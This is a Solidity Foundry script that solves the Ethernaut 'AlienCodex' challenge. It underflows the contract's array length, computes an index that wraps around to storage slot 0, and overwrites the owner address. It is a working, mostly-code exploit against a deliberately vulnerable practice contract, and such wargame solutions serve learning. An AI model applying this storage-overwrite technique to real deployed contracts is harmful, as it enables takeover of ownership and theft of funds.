// SPDX-License-Identifier: UNLICENSED
// Note: using 0.8.15 here to avoid type errors when explicityly casting bytes memory to bytes32
pragma solidity ^0.8.15;

import {Script} from "forge-std/Script.sol";
import {EthernautScript} from "src/common/EthernautScript.sol";

// @dev Created a separate interface contract since original problem code was pragma ^0.5.0
interface IAlienCodex {
    function owner() external view returns (address);
    function contact() external view returns (bool);
    function make_contact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        IAlienCodex alienCodex = IAlienCodex(_instanceAddress);

        vm.startBroadcast();
        alienCodex.make_contact();
        // Create length underflow in array, allowing us to access all of storage with it
        alienCodex.retract();
        vm.stopBroadcast();

        // Create length underflow in array, allowing us to access all of storage with it
        uint256 offsetToOwnerStorageLocation = _calculateArrayIndex(0, 1);
        address newOwner = tx.origin;

        // Since contact boolean is in the same storage location we copy its value (as uint) to keep it unchanged
        uint96 contactUint;
        if (alienCodex.contact()) {
            contactUint = 1;
        } else {
            contactUint = 0;
        }

        bytes memory encodedData = abi.encodePacked(contactUint, newOwner);
        bytes32 encodedDataBytes32 = bytes32(bytes(encodedData));

        vm.startBroadcast();
        // Change owner
        alienCodex.revise(offsetToOwnerStorageLocation, encodedDataBytes32);
        vm.stopBroadcast();

        assert(alienCodex.owner() == newOwner);
    }

    function getLevelAddress() internal view override returns (address) {
        return 0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272;
    }

    // @dev Calculates the array index to reach given storage index
    // @dev Inspired by: https://medium.com/@fifiteen82726/solidity-attack-array-underflow-1dc67163948a#:~:text=An%20underflow%20error%20occurs%20when,is%20undefined%20in%20many%20languages.
    // @param _arrayStorageIndex      Storage index at which the array starts
    // @param _targetStorageIndex     Storage index of the value we want to change via the array
    function _calculateArrayIndex(
        uint256 _targetStorageIndex,
        uint256 _arrayStorageIndex
    )
        public
        view
        returns (uint256)
    {
        bytes memory arrayStorageIndexBytes =
            abi.encodePacked(_arrayStorageIndex);
        bytes32 arrayStorageLocationBytes = keccak256(arrayStorageIndexBytes);
        uint256 arrayStorageLocationUint = uint256(arrayStorageLocationBytes);
        uint256 arrayIndex =
            type(uint256).max - arrayStorageLocationUint + _targetStorageIndex + 1;
        return arrayIndex;
    }
}
